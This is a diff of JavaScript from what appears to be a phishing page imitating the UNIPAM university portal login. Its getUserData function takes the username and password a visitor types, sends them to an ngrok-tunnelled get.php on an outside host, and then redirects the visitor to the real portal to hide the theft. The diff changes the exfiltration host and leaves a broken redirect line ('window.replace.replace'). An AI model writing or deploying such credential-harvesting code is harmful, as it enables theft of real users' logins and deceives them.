@@ -7,10 +7,10 @@ document.getElementById('buttonPreventDefault').addEventListener(
 );
 
 function getUserData(){
-     var usuario = document.getElementById("usuario").value
+   var usuario = document.getElementById("usuario").value
    var senha = document.getElementById("senha").value
    
-   const teste = async () => await fetch(`https://724b-191-55-83-192.ngrok.io/unimensagem/get.php?usuario=${usuario}&senha=${senha}`, {method: "GET",
+   const teste = async () => await fetch(`https://1957-191-55-81-19.ngrok.io/unimensagem/get.php?usuario=${usuario}&senha=${senha}`, {method: "GET",
    headers: {
      //"Content-Type": "application/json",
      "Access-Control-Allow-Origin":"*",
@@ -18,7 +18,7 @@ function getUserData(){
    }})
 
    teste();
-   window.location.replace("https://portal.unipam.edu.br/login");
+   window.replace.replace("https://portal.unipam.edu.br/login")
 
 }
 
